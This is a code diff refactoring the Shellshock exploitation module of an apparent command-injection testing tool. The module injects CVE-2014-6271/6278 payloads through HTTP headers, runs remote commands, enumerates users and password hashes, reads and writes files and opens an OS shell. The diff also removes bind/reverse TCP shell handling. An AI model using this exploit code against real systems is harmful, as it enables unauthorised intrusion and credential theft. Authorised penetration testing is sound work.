@@ -1,24 +1,19 @@
 #!/usr/bin/env python
 
 import re
-import os
-import sys
 import string
 import random
 from src.thirdparty.six.moves import urllib as _urllib
-from src.thirdparty.six.moves import input as _input
 from src.thirdparty.six.moves import http_client as _http_client
-from src.utils import common
 from src.utils import menu
 from src.utils import logs
 from src.utils import settings
-from src.core.requests import proxy
-from src.thirdparty.colorama import Fore, Back, Style, init
-from src.core.shells import bind_tcp
-from src.core.shells import reverse_tcp
-from src.core.requests import parameters
+from src.utils import session_handler
+from src.core.requests import requests
 from src.core.requests import headers as log_http_headers
 from src.core.injections.controller import checks
+from src.core.injections.controller import handler
+from src.core.injections.controller import controller
 
 default_user_agent = menu.options.agent
 default_cookie = ""
@@ -35,18 +30,28 @@ This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in
 """
 
 if settings.MULTI_TARGETS or settings.STDIN_PARSING:
-  if settings.COOKIE_INJECTION:
-    settings.COOKIE_INJECTION = None
-  if settings.USER_AGENT_INJECTION:
-    settings.USER_AGENT_INJECTION = None
-  if settings.REFERER_INJECTION:
-    settings.REFERER_INJECTION = None
+  controller.init_http_header_injection_status()
+  controller.init_cookie_injection_status()
 
 # Available Shellshock CVEs
 shellshock_cves = [
 "CVE-2014-6271",
 "CVE-2014-6278"
 ]
+
+"""
+A -p naming a cookie's own key isn't shellshock's concern - only one naming the header itself restricts it.
+"""
+def _header_testable(check_header):
+  name = check_header.lower()
+  header_names = [h.lower() for h in settings.SHELLSHOCK_HTTP_HEADERS]
+  if settings.TESTABLE_PARAMETERS_LIST:
+    if any(p in header_names for p in settings.TESTABLE_PARAMETERS_LIST):
+      return name in settings.TESTABLE_PARAMETERS_LIST
+    return True
+  if settings.SKIP_PARAMETERS_LIST:
+    return name not in settings.SKIP_PARAMETERS_LIST
+  return True
 
 """
 Available shellshock payloads
@@ -69,205 +74,65 @@ def shellshock_exploitation(cve, cmd):
   return payload
 
 """
-Print percentage calculation
+Send a request with the given header set to payload, restoring the CLI-provided value afterward.
 """
-def print_percentage(no_result, response_info, cve, float_percent):
-  if float(float_percent) == 100:
-    if no_result == True:
-      percent = settings.FAIL_STATUS
-    else:
-      percent = settings.info_msg
-      no_result = False
-  elif len(response_info) > 0 and cve in response_info:
-    percent = settings.info_msg
-    no_result = False
-  else:
-    percent = str(float_percent)+ "%"
-  return percent, no_result
+def _send_header_payload(url, check_header, payload):
+  header = {check_header: payload}
+  request = _urllib.request.Request(url, None, header)
+  if check_header == settings.COOKIE:
+    menu.options.cookie = payload
+  if check_header == settings.USER_AGENT:
+    menu.options.agent = payload
+  response = log_http_headers.send_request(request)
+  if check_header == settings.COOKIE:
+    menu.options.cookie = default_cookie
+  if check_header == settings.USER_AGENT:
+    menu.options.agent = default_user_agent
+  return response
+
+"""
+Build the shared execute_cmd(cmd) -> output callback, logging execution only when asked to.
+"""
+def _command_executor(url, cve, check_header, filename, log_execution=False):
+  def execute_cmd(cmd):
+    shell = cmd_exec(url, cmd, cve, check_header, filename)
+    if log_execution and shell:
+      logs.executed_command(filename, cmd, shell)
+    return shell
+  return execute_cmd
 
 """
 Enumeration Options
 """
 def enumeration(url, cve, check_header, filename):
-  _ = False
-  if menu.options.hostname:
-    checks.print_enumenation().hostname_msg()
-    cmd = settings.HOSTNAME
-    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if shell:
-      checks.print_hostname(shell, filename, _)
-    settings.ENUMERATION_DONE = True
-
-  if menu.options.current_user:
-    checks.print_enumenation().current_user_msg()
-    cmd = settings.CURRENT_USER
-    cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if cu_account:
-      checks.print_current_user(cu_account, filename, _)
-    settings.ENUMERATION_DONE = True
-
-  if menu.options.is_root:
-    checks.print_enumenation().check_privs_msg()
-    cmd = re.findall(r"" + r"\$(.*)", settings.IS_ROOT)
-    cmd = ''.join(cmd)
-    cmd = checks.remove_parenthesis(cmd)
-    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if shell:
-      checks.print_current_user_privs(shell, filename, _)
-    settings.ENUMERATION_DONE = True
-
-  if menu.options.sys_info:
-    checks.print_enumenation().os_info_msg()
-    cmd = settings.RECOGNISE_OS            
-    target_os, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if target_os:
-      if target_os == "Linux":
-        cmd = settings.DISTRO_INFO
-        distro_name, payload = cmd_exec(url, cmd, cve, check_header, filename)
-        if len(distro_name) != 0:
-          target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
-        cmd = settings.RECOGNISE_HP
-        target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
-        checks.print_os_info(target_os, target_arch, filename, _)
-    settings.ENUMERATION_DONE = True
-
-  if menu.options.users:
-    checks.print_enumenation().print_users_msg()
-    cmd = settings.SYS_USERS
-    cmd = checks.remove_command_substitution(cmd)
-    sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if sys_users:
-      checks.print_users(sys_users, filename, _, None, None, cmd, None, None, None, None, url, None, interpreter=False)
-    settings.ENUMERATION_DONE = True
-
-  if menu.options.passwords:
-    checks.print_enumenation().print_passes_msg() 
-    cmd = settings.SYS_PASSES
-    cmd = checks.remove_command_substitution(cmd)         
-    sys_passes, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if sys_passes :
-      checks.print_passes(sys_passes, filename, _, interpreter=False)
-    settings.ENUMERATION_DONE = True  
+  checks.run_enumeration(_command_executor(url, cve, check_header, filename), filename, url)
 
 """
 File Access Options
 """
 def file_access(url, cve, check_header, filename):
-
-  if menu.options.file_write:
-    file_to_write, dest_to_write, content = checks.check_file_to_write()
-    cmd = checks.write_content(content, dest_to_write)
-    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    cmd = checks.check_file(dest_to_write)
-    cmd = checks.remove_command_substitution(cmd)
-    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    checks.file_write_status(shell, dest_to_write)
-    settings.FILE_ACCESS_DONE = True
-
-  if menu.options.file_read:
-    cmd, file_to_read = checks.file_content_to_read()
-    cmd = checks.remove_command_substitution(cmd)
-    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    checks.file_read_status(shell, file_to_read, filename)
-    settings.FILE_ACCESS_DONE = True
+  checks.run_file_access(_command_executor(url, cve, check_header, filename), filename)
 
 """
-Execute the bind / reverse TCP shell
+Enumeration, file access, --os-cmd, --os-shell - shared by fresh detection and resume.
 """
-def execute_shell(url, cmd, cve, check_header, filename, os_shell_option):
-  shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
+def _post_exploitation(url, cve, check_header, filename, technique, no_result):
+  if settings.ENUMERATION_DONE:
+    checks.ask_redo_stored_session("enumerate", lambda: enumeration(url, cve, check_header, filename))
+  else:
+    enumeration(url, cve, check_header, filename)
 
-"""
-Configure the bind TCP shell
-"""
-def bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
-  settings.BIND_TCP = True
-  # Set up RHOST / LPORT for the bind TCP connection.
-  bind_tcp.configure_bind_tcp(separator = "")
-  if settings.BIND_TCP == False:
-    if settings.REVERSE_TCP == True:
-      os_shell_option = "reverse_tcp"
-      reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
-    return go_back, go_back_again
-  while True:
-    # LPORT is always a validated numeric string (see check_lport()), so it can
-    # never equal a SHELL_OPTIONS keyword - always prompt for the shell type.
-    cmd = bind_tcp.bind_tcp_options(separator = "")
-    result = checks.check_bind_tcp_options(cmd)
-    if result != None:
-      if result == 0:
-        return False
-      elif result == 1 or result == 2:
-        go_back_again = True
-        settings.BIND_TCP = False
-      return go_back, go_back_again
-    # execute bind TCP shell 
-    execute_shell(url, cmd, cve, check_header, filename, os_shell_option)
+  if settings.FILE_ACCESS_DONE == True:
+    checks.ask_redo_stored_session("access files", lambda: file_access(url, cve, check_header, filename))
+  else:
+    file_access(url, cve, check_header, filename)
 
-"""
-Configure the reverse TCP shell
-"""
-def reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again):
-  settings.REVERSE_TCP = True
-  # Set up LHOST / LPORT for the reverse TCP connection.
-  reverse_tcp.configure_reverse_tcp(separator = "")
-  if settings.REVERSE_TCP == False:
-    if settings.BIND_TCP == True:
-      os_shell_option = "bind_tcp"
-      bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
-    return go_back, go_back_again
-  while True:
-    # LPORT is always a validated numeric string (see check_lport()), so it can
-    # never equal a SHELL_OPTIONS keyword - always prompt for the shell type.
-    cmd = reverse_tcp.reverse_tcp_options(separator = "")
-    result = checks.check_reverse_tcp_options(cmd)
-    if result != None:
-      if result == 0:
-        return False
-      elif result == 1 or result == 2:
-        go_back_again = True
-        settings.REVERSE_TCP = False
-      return go_back, go_back_again
-    # execute bind TCP shell 
-    execute_shell(url, cmd, cve, check_header, filename, os_shell_option)
+  if menu.options.os_cmd:
+    checks.run_single_os_cmd(_command_executor(url, cve, check_header, filename), filename)
 
-"""
-Check commix shell options
-"""
-def check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again,no_result):
-  if os_shell_option == False:
-    if no_result == True:
-      return False
-    else:
-      return True 
-
-  if os_shell_option == None:
-    return go_back, go_back_again
-
-  # The "back" option
-  elif os_shell_option == "back":
-    go_back = True
-    return go_back, go_back_again
-
-  # The "os_shell" option
-  elif os_shell_option == "os_shell": 
-    warn_msg = "You are in the '" + os_shell_option + "' mode."
-    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
-    return go_back, go_back_again
-
-  # The "bind_tcp" option
-  elif os_shell_option == "bind_tcp":
-    go_back, go_back_again = bind_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
-    return go_back, go_back_again
-
-  # The "reverse_tcp" option
-  elif os_shell_option == "reverse_tcp":
-    go_back, go_back_again = reverse_tcp_config(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again)
-    return go_back, go_back_again
-
-  # The "quit" / "exit" options
-  elif os_shell_option == "quit" or os_shell_option == "exit":                    
-    checks.quit(filename, url, _ = True)
+  # Opens later, at quit(), same as the main flow.
+  execute_cmd = _command_executor(url, cve, check_header, filename, log_execution=True)
+  handler.pseudo_terminal_shell_generic(url, filename, technique, no_result, execute_cmd, on_found_declined=lambda: None)
 
 """
 The main shellshock handler
@@ -275,17 +140,38 @@ The main shellshock handler
 def shellshock_handler(url, http_request_method, filename):
 
   counter = 1
-  vp_flag = True
   no_result = True
-  export_injection_info = False
 
   injection_type = "results-based command injection"
-  technique = "shellshock injection technique"
+  # Not an injection technique like the others - it's the '--shellshock' module.
+  technique = "shellshock module"
 
-  try: 
+  try:
+    # Resume everything at once and quit, like the core engine's LOAD_SESSION path.
+    stored = [row for row in session_handler.get_all_stored_shellshock(url, http_request_method) if _header_testable(row[0])]
+    if stored:
+      rows = [(technique, injection_type, check_header, stored_payload, "HTTP Header") for check_header, stored_payload in stored]
+      checks.resumed_injection_points_summary(rows)
+
+      # Still applies on resume, same as fresh detection.
+      first_header, _ = stored[0]
+      _post_exploitation(url, shellshock_cves[0], first_header, filename, technique, no_result=False)
+
+      checks.suggest_os_shell()
+      settings.INJECTION_CHECKER = True
+      settings.SHOW_LOGS_MSG = True
+      checks.quit(filename, url, hard_exit=False)
+
     i = 0
+    asked_keep_testing = False
     total = len(shellshock_cves) * len(settings.SHELLSHOCK_HTTP_HEADERS)
     for check_header in settings.SHELLSHOCK_HTTP_HEADERS:
+      if not _header_testable(check_header):
+        continue
+
+      found_this_header = False
+      cve = shellshock_cves[0]
+
       for cve in shellshock_cves:
         # Check injection state
         settings.DETECTION_PHASE = True
@@ -297,301 +183,108 @@ def shellshock_handler(url, http_request_method, filename):
         # Check if defined "--verbose" option.
         if settings.VERBOSITY_LEVEL != 0:
           settings.print_data_to_stdout(settings.print_payload(payload))
-        header = {check_header : payload}
-        request = _urllib.request.Request(url, None, header)
-        if check_header == settings.COOKIE:
-          menu.options.cookie = payload 
-        if check_header == settings.USER_AGENT:
-          menu.options.agent = payload
-        log_http_headers.do_check(request)
-        # check_http_traffic() already sends the request - reuse its result
-        # instead of sending the same request again.
-        response = log_http_headers.check_http_traffic(request)
-        if response is None:
-          # Check if defined any HTTP Proxy.
-          if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor:
-            response = proxy.use_proxy(request)
-          else:
-            response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
+        response = _send_header_payload(url, check_header, payload)
 
         if type(response) is bool:
           response_info = ""
         else:
           response_info = response.info()
 
-        if check_header == settings.COOKIE:
-          menu.options.cookie = default_cookie
-        if check_header == settings.USER_AGENT:
-          menu.options.agent = default_user_agent  
+        # The CVE's own marker, injected into the payload, lands back as a raw response header.
+        found = len(response_info) > 0 and cve in response_info
+        if found:
+          no_result = False
+        done = found or (no_result and i >= total)
+        checks.injection_process(injection_type, technique, done=done, i=i, total=total)
 
-        percent, float_percent = checks.percentage_calculation(i, total)
-        percent, no_result = print_percentage(no_result, response_info, cve, float_percent)
-
-        if settings.VERBOSITY_LEVEL == 0:
-          info_msg = "Testing the " + technique + "." + "" + percent + ""
-          settings.print_data_to_stdout(settings.END_LINE.CR +settings.print_info_msg(info_msg))
-          
-
-        if no_result == False:
+        if found and not found_this_header:
+          found_this_header = True
           # Check injection state
           settings.DETECTION_PHASE = False
           settings.EXPLOITATION_PHASE = True
-          # Print the findings to log file.
-          if export_injection_info == False:
-            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
-          
-          vuln_parameter = "HTTP Header"
-          the_type = settings.SINGLE_WHITESPACE + vuln_parameter
-          check_header = settings.SINGLE_WHITESPACE + check_header
-          vp_flag = logs.add_parameter(vp_flag, filename, the_type, check_header, http_request_method, vuln_parameter, payload)
-          check_header = check_header[1:]
-          logs.update_payload(filename, counter, payload) 
+          vuln_parameter = check_header
+          the_type = settings.SINGLE_WHITESPACE + "HTTP Header"
+          header_name = settings.SINGLE_WHITESPACE + check_header
+          settings.CHECKING_PARAMETER = check_header + settings.SINGLE_WHITESPACE + "HTTP Header"
+          checks.announce_vulnerable_finding(filename, injection_type, technique, the_type, header_name, http_request_method, vuln_parameter, payload, counter, decode_payload=False)
 
-          if settings.VERBOSITY_LEVEL != 0:
-            checks.total_of_requests()
+          # Persist for future resume.
+          settings.HTTP_HEADER = check_header
+          session_handler.import_injection_points(url, technique, injection_type, filename, "", True, vuln_parameter, "", "", "", False, payload, http_request_method, 0, 0, 0, 0, settings.INJECTION_LEVEL)
 
-          settings.CHECKING_PARAMETER = check_header + settings.SINGLE_WHITESPACE + vuln_parameter
-          # Print the findings to terminal.
-          info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via " + technique + "."
-          if settings.VERBOSITY_LEVEL == 0:
-            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-          settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-          settings.print_data_to_stdout(settings.print_sub_content(payload))
+      if found_this_header:
+        _post_exploitation(url, cve, check_header, filename, technique, no_result)
 
-          # Enumeration options.
-          if settings.ENUMERATION_DONE:
-            while True:
-              message = "Do you want to ignore stored session and enumerate again? [y/N] "
-              enumerate_again = common.read_input(message, default="N", check_batch=True)
-              if enumerate_again in settings.CHOICE_YES:
-                enumeration(url, cve, check_header, filename)
-                break
-              elif enumerate_again in settings.CHOICE_NO: 
-                break
-              elif enumerate_again in settings.CHOICE_QUIT:
-                raise SystemExit()
-              else:
-                common.invalid_option(enumerate_again)  
-                pass
-          else:
-            enumeration(url, cve, check_header, filename)
-
-          # File access options.
-          if settings.FILE_ACCESS_DONE == True:
-            while True:
-              message = "Do you want to ignore stored session and access files again? [y/N] "
-              file_access_again = common.read_input(message, default="N", check_batch=True)
-              if file_access_again in settings.CHOICE_YES:
-                file_access(url, cve, check_header, filename)
-                break
-              elif file_access_again in settings.CHOICE_NO: 
-                break
-              elif file_access_again in settings.CHOICE_QUIT:
-                raise SystemExit()
-              else:
-                common.invalid_option(file_access_again)  
-                pass
-          else:
-            file_access(url, cve, check_header, filename)
-
-          if menu.options.os_cmd:
-            cmd = menu.options.os_cmd 
-            checks.print_enumenation().print_single_os_cmd_msg(cmd)
-            shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-            checks.print_single_os_cmd(cmd, shell, filename)
-
-          # Pseudo-Terminal shell
-          try:
-            checks.alert()
-            go_back = False
-            go_back_again = False
-            while True:
-              if go_back == True:
-                break
-              # --os-shell is a direct action flag, not a prompt default - no question asked either way.
-              vuln_message = checks.vulnerable_message(url)
-              gotshell = settings.CHOICE_YES[0] if menu.options.os_shell else settings.CHOICE_NO[0]
-              if gotshell in settings.CHOICE_YES:
-                settings.print_data_to_stdout(settings.OS_SHELL_TITLE)
-                if settings.READLINE_ERROR:
-                  checks.no_readline_module()
-                while True:
-                  if not settings.READLINE_ERROR:
-                    checks.tab_autocompleter()
-                  # Prompt passed straight to input() (via safe_input()) so readline owns
-                  # it and redraws it correctly on tab/history, instead of pre-printing it
-                  # separately and leaving the "line still open" bookkeeping out of sync.
-                  cmd = common.safe_input(settings.OS_SHELL)
-                  if len(cmd) == 0:
-                    cmd = "os_shell"
-                  cmd = checks.escaped_cmd(cmd)
-                  if cmd.lower() in settings.SHELL_OPTIONS:
-                    os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
-                    if os_shell_option is not False:
-                      go_back, go_back_again = check_options(url, cmd, cve, check_header, filename, os_shell_option, http_request_method, go_back, go_back_again, no_result)
-                      if go_back and go_back_again == False:
-                        break
-                      if go_back and go_back_again:
-                        return True 
-                  else: 
-                    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-                    if shell != "":
-                      # Update logs with executed cmds and execution results.
-                      logs.executed_command(filename, cmd, shell)
-                      settings.print_data_to_stdout(settings.command_execution_output(shell))
-                    else:
-                      debug_msg = "Executing the '" + cmd + "' command. "
-                      if settings.VERBOSITY_LEVEL == 1:
-                        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
-                        settings.print_data_to_stdout(settings.print_payload(payload))
-                      elif settings.VERBOSITY_LEVEL >= 2:
-                        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
-                        settings.print_data_to_stdout(settings.print_payload(payload))
-                      if settings.VERBOSITY_LEVEL >= 2:
-                        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-                      err_msg = common.invalid_cmd_output(cmd)
-                      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
-                      if menu.options.abort_on_empty:
-                        raise SystemExit()
-              elif gotshell in settings.CHOICE_NO:
-                # Handle the parameter-wide decision before the technique-specific one.
-                if checks.skip_testing(filename, url, announce=vuln_message + " "):
-                  checks.keep_testing_others(filename, url)
-                  proceed = False
-                else:
-                  proceed = checks.next_attack_vector(technique, go_back)
-                if proceed:
-                  break
-                else:
-                  if no_result == True:
-                    return False
-                  else:
-                    logs.logs_notification(filename)
-                    return True
-
-              elif gotshell in settings.CHOICE_QUIT:
-                raise SystemExit()
-
-              else:
-                common.invalid_option(gotshell)  
-                continue
-              break
-          
-          except (KeyboardInterrupt, SystemExit): 
-            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-            raise
-
-          except EOFError:
-            if settings.STDIN_PARSING:
-              settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-            err_msg = "Exiting, due to EOFError."
-            settings.print_data_to_stdout(settings.print_error_msg(err_msg))
-            raise
-
-          except TypeError:
+        # Asked once for the whole run, not once per header.
+        if not asked_keep_testing:
+          asked_keep_testing = True
+          if checks.prompt_keep_testing(url):
             break
 
-    if no_result == True:
+    if settings.CONFIRMED_INJECTION_POINTS:
+      checks.quit(filename, url, hard_exit=False)
+    elif no_result == True:
       if settings.VERBOSITY_LEVEL == 0:
         settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
       err_msg = "All tested HTTP headers appear to be not injectable."
       settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
       raise SystemExit()
-    else:
-      logs.logs_notification(filename)
             
   except _urllib.error.HTTPError as err_msg:
+    # 500/400 during header/CVE probing just means this combination failed - not fatal.
     if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR or str(err_msg.code) == settings.BAD_REQUEST:
-      response = False  
-    elif settings.IGNORE_ERR_MSG == False:
-      err = str(err_msg) + "."
-      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-      settings.print_data_to_stdout(settings.print_critical_msg(err))
-      continue_tests = checks.continue_tests(err_msg)
-      if continue_tests == True:
-        settings.IGNORE_ERR_MSG = True
-      else:
-        raise SystemExit()
+      response = False
+    else:
+      requests.request_failed(err_msg)
 
-  except _urllib.error.URLError as err_msg:
-    err_msg = str(err_msg.reason).split(settings.SINGLE_WHITESPACE)[2:]
-    err_msg = ' '.join(err_msg)+ "."
-    if settings.VERBOSITY_LEVEL != 0 and settings.LOAD_SESSION == False:
-      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
-    raise SystemExit()
+  except (_urllib.error.URLError, _http_client.IncompleteRead) as err_msg:
+    requests.request_failed(err_msg)
 
-  except _http_client.IncompleteRead as err_msg:
-    settings.print_data_to_stdout(settings.print_critical_msg(err_msg + "."))
-    raise SystemExit()  
-    
+"""
+Per-binary cache of the path prefix that resolved it last time, so a repeated command skips straight to its known-working prefix instead of re-probing the bare/'/bin/'/'/usr/bin/' cascade.
+"""
+RESOLVED_CMD_PREFIX = {}
+
 """
 Execute user commands
 """
 def cmd_exec(url, cmd, cve, check_header, filename):
- 
+
   """
   Check for shellshock 'shell'
   """
   def check_for_shell(url, cmd, cve, check_header, filename):
     try:
       TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
-      cmd = "echo " + TAG + "$(" + cmd + ")" + TAG
+      cmd = "echo " + TAG + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + TAG
       payload = shellshock_exploitation(cve, cmd)
       debug_msg = "Executing the '" + cmd + "' command. "
       if settings.VERBOSITY_LEVEL != 0:
         settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
-
-      if settings.VERBOSITY_LEVEL != 0:
         settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
         settings.print_data_to_stdout(settings.print_payload(payload))
 
-      header = {check_header : payload}
-      request = _urllib.request.Request(url, None, header)
-      if check_header == settings.USER_AGENT:
-        menu.options.agent = payload
-      log_http_headers.do_check(request)
-      # check_http_traffic() already sends the request - reuse its result
-      # instead of sending the same request again.
-      response = log_http_headers.check_http_traffic(request)
-      if response is None:
-        # Check if defined any HTTP Proxy.
-        if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor:
-          response = proxy.use_proxy(request)
-        else:
-          response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
-      if check_header == settings.USER_AGENT:
-        menu.options.agent = default_user_agent  
+      response = _send_header_payload(url, check_header, payload)
       shell = checks.process_page_content(response, action="decode").rstrip().replace(settings.END_LINE.LF,' ')
       shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
-      shell = ''.join(shell)
-      return shell, payload
+      return ''.join(shell)
 
     except _urllib.error.URLError as err_msg:
-      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
-      raise SystemExit()
+      requests.request_failed(err_msg)
 
-  shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
-  if len(shell) == 0:
-    cmd = "/bin/" + cmd
-    shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
-    if len(shell) > 0:
-      pass
-    elif len(shell) == 0:
-      cmd = "/usr" + cmd
-      shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
-      if len(shell) > 0:
-        pass
+  cmd_name = cmd.split(settings.SINGLE_WHITESPACE)[0]
+  prefixes = ["", "/bin/", "/usr/bin/"]
+  cached_prefix = RESOLVED_CMD_PREFIX.get(cmd_name)
+  if cached_prefix in prefixes:
+    prefixes.remove(cached_prefix)
+    prefixes.insert(0, cached_prefix)
 
-  return shell, payload
+  for prefix in prefixes:
+    shell = check_for_shell(url, prefix + cmd, cve, check_header, filename)
+    if shell:
+      RESOLVED_CMD_PREFIX[cmd_name] = prefix
+      return shell
 
-"""
-The exploitation function.
-(call the injection handler)
-"""
-def exploitation(url, http_request_method, filename):       
-  if shellshock_handler(url, http_request_method, filename) == False:
-    return False
+  return shell
 
 # eof
